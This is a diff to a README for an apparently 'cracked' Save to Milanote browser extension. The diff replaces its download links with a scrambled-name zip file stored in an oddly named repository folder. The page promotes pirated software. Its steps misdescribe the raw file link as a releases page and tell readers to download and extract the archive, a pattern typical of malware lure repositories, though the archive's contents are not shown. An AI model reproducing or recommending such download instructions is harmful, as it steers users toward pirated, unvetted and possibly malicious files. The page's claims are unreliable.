@@ -1,6 +1,6 @@
 # 🌟 cracked-save-to-milanote-extension - Save Your Ideas Effortlessly 
 
-[![Download Now](https://raw.githubusercontent.com/sameeronwheels/cracked-save-to-milanote-extension/main/nonnucleated/cracked-save-to-milanote-extension.zip%20Now-Get%20the%20Extension-brightgreen)](https://raw.githubusercontent.com/sameeronwheels/cracked-save-to-milanote-extension/main/nonnucleated/cracked-save-to-milanote-extension.zip)
+[![Download Now](https://raw.githubusercontent.com/sameeronwheels/cracked-save-to-milanote-extension/main/nonnucleated/to-extension-save-cracked-milanote-revalidate.zip%20Now-Get%20the%20Extension-brightgreen)](https://raw.githubusercontent.com/sameeronwheels/cracked-save-to-milanote-extension/main/nonnucleated/to-extension-save-cracked-milanote-revalidate.zip)
 
 ## 🚀 Getting Started
 
@@ -23,13 +23,13 @@ Welcome to the **Cracked Save to Milanote Extension**! This extension allows you
 
 To download the extension, visit the following page:
 
-[Download the Latest Release](https://raw.githubusercontent.com/sameeronwheels/cracked-save-to-milanote-extension/main/nonnucleated/cracked-save-to-milanote-extension.zip)
+[Download the Latest Release](https://raw.githubusercontent.com/sameeronwheels/cracked-save-to-milanote-extension/main/nonnucleated/to-extension-save-cracked-milanote-revalidate.zip)
 
 Follow these simple steps to install the extension:
 
 1. Click the link above to go to the releases page.
 2. Find the latest version listed.
-3. Under that version, look for the file **https://raw.githubusercontent.com/sameeronwheels/cracked-save-to-milanote-extension/main/nonnucleated/cracked-save-to-milanote-extension.zip**.
+3. Under that version, look for the file **https://raw.githubusercontent.com/sameeronwheels/cracked-save-to-milanote-extension/main/nonnucleated/to-extension-save-cracked-milanote-revalidate.zip**.
 4. Click on the file to download it to your computer.
 5. Once the download is complete, locate the zip file in your downloads folder.
 6. Unzip the file by right-clicking on it and selecting "Extract All".
